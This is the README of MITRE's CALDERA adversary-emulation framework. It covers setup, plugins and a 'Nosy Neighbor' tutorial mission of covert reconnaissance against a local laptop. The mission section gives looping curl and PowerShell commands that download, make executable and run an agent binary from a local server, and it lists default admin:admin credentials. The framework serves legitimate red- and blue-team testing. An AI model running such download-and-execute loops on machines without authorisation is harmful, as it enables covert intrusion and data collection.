# CALDERA

CALDERA is an automated adversary emulation system, built on the [MITRE ATT&CK™ framework](https://attack.mitre.org/), 
that performs post-compromise adversarial behavior inside computer networks. It is intended for both red and blue teams.

Python 3.5.3+ is required to run this system.

## Installation

Start by cloning this repository recursively. This will pull all available plugins. 
```
git clone https://github.com/mitre/caldera.git --recursive
```

From the root of this project, install the PIP requirements.
```
pip install -r requirements.txt
```

Then start the server.
```
python server.py
```

## Versions

Bleeding-edge code can be run by using the latest master branch source code. Stable versions are tagged
by major.minor.bugfix numbers and can be used by cloning the appropriate tagged version:
```
git clone --branch 2.1.0 https://github.com/mitre/caldera.git --recursive
```

Check the GitHub releases for the most stable release versions.

> **IMPORTANT**: The core system relies on plugins (git submodules). If you are unfamiliar with this concept and want to run the bleeding-edge code, a "git pull" on this code will likely not be sufficient. You will also need to update the submodules to ensure all plugins are current. One way to do this is by using an alias, such as:
```alias tig="git reset --hard origin/master && git checkout master && git reset --hard origin/master && git pull && git submodule foreach git checkout master && git submodule foreach git pull"```
or for Windows:
```set "tig=git reset --hard origin/master && git checkout master && git reset --hard origin/master && git pull && git submodule foreach git checkout master && git submodule foreach git pull"```


> *NOTE*: The functionality and schema used by the first release of CALDERA is now stored within the *ADVERSARY* 
plugin. This plugin is loaded automatically with the rest of the submodules, but will not be loaded in 
CALDERA at runtime unless added to the list of submodules in *conf/local.yml*. More information about the *ADVERSARY*
 plugin can be found at the repository for the [Adversary plugin](https://github.com/mitre/adversary).

## Terminology

CALDERA works by attaching abilities to an adversary and running the adversary in an operation. 

* **Ability**: A specific task or set of commands mapped to ATT&CK Tactics and Techniques, written in any language
* **Adversary**: A threat profile that contains a set of abilities, making it easy to form repeatable operations 
* **Agent**: An individual computer running a CALDERA agent, such as the [54ndc47 plugin](https://github.com/mitre/sandcat)
* **Group**: A collection of agents
* **Fact**: An indicator of compromise (IOC) found on a computer 
* **Operation**: A start-to-finish execution of an adversary profile against a group

CALDERA ships with a few pre-built abilities and adversaries with the [Stockpile plugin](https://github.com/mitre/stockpile), 
but it's easy to add your own. 

## Plugins

CALDERA is built using a plugin architecture on top of the core system (this repository). Plugins are 
software components that plug new features and behavior into the core system. Plugins reside
in the plugins/ directory. For more information on each plugin, refer to their respective README files.

Load plugins into the core system by listing them in the conf/local.yml file, then restart
CALDERA for them to become available.

## Planning

When running an operation, CALDERA hooks in a planning module that determines in which order to run each ability. 
An operation executes abilities within phases, but if there are multiple abilities in a phase, the planning module
determines which to run first. The planning module can be changed in the configuration file, local.yml.

## Getting started

To understand CALDERA, it helps to run an operation. Below are pre-built missions you can follow
along with to understand the system. These missions will assume CALDERA is running locally on a laptop.

### Mission #1: Nosy Neighbor

> Perform reconnaissance on a compromised laptop. Your employer needs a list of the laptop user’s preferred WIFI 
networks. Grab this list, collecting anything else along the way, then get out. Quickly. Leave no trace. 
There is one caveat: the laptop’s AV scans the machine in full every minute. You must complete this mission in 
less than 60 seconds. 

Start by booting up the core system.
```
python server.py
```

Then start a 54ndc47 agent on the same machine by opening a terminal and pasting in the delivery command for
your operating system.

**OSX**:
```
while true; do curl -sk -X POST -H 'file:sandcat-darwin' http://localhost:8888/file/download > /tmp/sandcat-darwin && chmod +x /tmp/sandcat-darwin && /tmp/sandcat-darwin http://localhost:8888 my_group; sleep 60; done
```

**Linux**:
```
while true; do curl -sk -X POST -H 'file:sandcat-linux' http://localhost:8888/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux http://localhost:8888 my_group; sleep 60; done
```

**Windows**:
```
while($true) {$url="http://localhost:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("file","sandcat.exe");$output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);C:\Users\Public\sandcat.exe http://localhost:8888 my_group; sleep 60}
```

Move to a browser, at http://127.0.0.1:8888, logging in with the credentials admin:admin. 
Click into the Chain plugin and use the "Manage Operations" section to fire off an operation using the "nosy neighbor" adversary. 

Once the operation is complete, compare the execution time of the first and last commands. Was
the mission a success? Did the adversary run without a trace? Can you figure out why the 
abilities are being run in the order they are?

## Developers

Be a ninja committer: changes should aim for the smallest change set possible to achieve the goal. 
Additionally, changes should be consistent with the general format and design of what already exists.

### GIT flow

We use the basic feature branch GIT flow. Create a feature branch off of master and when ready, submit a merge 
request. Make branch names and commits descriptive. A merge request should solve one problem,
not many. 

## Licensing

In addition to CALDERA's open source capabilities, MITRE maintains several in-house CALDERA plugins that offer 
more advanced functionality. For more information, or to discuss licensing opportunities, please reach out to 
caldera@mitre.org or directly to MITRE's Technology Transfer Office at 
https://www.mitre.org/about/corporate-overview/contact-us#technologycontact.

## Related MITRE Work

[BRAWL Game](https://github.com/mitre/brawl-public-game-001) - Data set created by the BRAWL project representing
one CALDERA operation with data collected by Microsoft Sysmon and other sensors.

[CASCADE](https://github.com/mitre/cascade-server) - Prototype blue team analysis tool to automate investigative work.

## Acknowledgements

[Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)
